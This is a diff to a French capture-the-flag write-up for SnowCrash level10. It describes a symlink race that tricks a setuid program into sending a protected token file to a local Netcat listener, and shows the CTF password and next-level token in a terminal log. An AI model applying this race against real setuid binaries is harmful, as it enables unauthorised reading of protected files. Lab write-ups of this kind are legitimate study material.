@@ -54,8 +54,11 @@ for (( ; ; )); do         ln -fs /tmp/swap /tmp/toto;         ln -fs ~/token /tm
 Lorsque tout cela est en place, level10 envoie continuellement des données vers le serveur Netcat, qui les filtre et stocke le résultat dans un fichier. Parallèlement, les liens symboliques sont modifiés pour pointer vers le fichier token. Cette combinaison d'actions vous permet de récupérer le contenu de token et d'obtenir le jeton du niveau suivant.
 
 ```bash
-su flag10
-woupa2yuojeeaaed06riuj63c
+level10@SnowCrash:~$ su flag11
+Password: woupa2yuojeeaaed06riuj63c
+flag11@SnowCrash:~$ getflag
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+
 ```
 
 Script pour recup le flag
@@ -79,5 +82,4 @@ sleep 2
 killall nc &>/dev/null
 killall bash &>/dev/null
 ```
-
 
